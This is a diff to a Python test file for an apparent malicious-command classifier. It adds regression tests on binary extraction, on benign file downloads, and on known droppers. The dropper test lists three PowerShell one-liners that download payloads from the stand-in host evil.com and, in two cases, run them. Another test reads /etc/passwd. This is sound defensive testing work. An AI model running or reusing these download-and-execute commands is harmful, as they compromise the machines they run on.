@@ -12,6 +12,7 @@ import gzip
 from app.classifier import classify
 from app.parent_score import score_parent
 from app.redactor import redact
+from app.scoring import compute_verdict
 
 
 # ---------------------------------------------------------------------------
@@ -235,3 +236,47 @@ def test_masquerade_no_false_positive_on_short_or_unrelated():
     assert _detect_masquerade("notepad") is None
     assert _detect_masquerade("myapp") is None
     assert _detect_masquerade("certutil") is None
+
+
+# ── Regression: argument tokens must not be extracted as binaries ─────────────
+
+from app.parser import extract_binaries
+
+
+def test_extract_binaries_ignores_subcommands_and_args():
+    assert extract_binaries("npm install --save-dev typescript eslint") == ["npm"]
+    assert extract_binaries("pip install requests flask sqlalchemy") == ["pip"]
+    assert extract_binaries("docker run --rm -it nginx:latest") == ["docker"]
+
+
+def test_extract_binaries_keeps_command_position_tokens():
+    # First token + token after a pipe are both real command positions.
+    assert extract_binaries("cat /etc/passwd | grep root") == ["cat", "grep"]
+
+
+# ── Regression: benign HTTP downloads are not high-confidence droppers ────────
+
+def test_benign_invoke_webrequest_not_malicious():
+    cmd = "Invoke-WebRequest -Uri https://example.com/report.pdf -OutFile report.pdf"
+    v = compute_verdict(classify(cmd, []))
+    assert v["severity"] in ("clean", "low"), v
+
+
+def test_benign_multiline_downloads_not_malicious():
+    cmd = (
+        "curl -L -o ubuntu.iso https://releases.ubuntu.com/22.04/ubuntu.iso\n"
+        "wget https://nodejs.org/dist/v20.11.0/node-v20.11.0-linux-x64.tar.xz\n"
+        "Invoke-WebRequest -Uri https://example.com/report.pdf -OutFile report.pdf"
+    )
+    v = compute_verdict(classify(cmd, []))
+    assert v["severity"] in ("clean", "low"), v
+
+
+def test_real_droppers_still_malicious():
+    for cmd in (
+        "Invoke-WebRequest -Uri http://evil.com/a.exe -OutFile a.exe; & a.exe",
+        "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://evil.com/a.exe','a.exe')\"",
+        "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')",
+    ):
+        v = compute_verdict(classify(cmd, []))
+        assert v["severity"] == "malicious", (cmd, v)
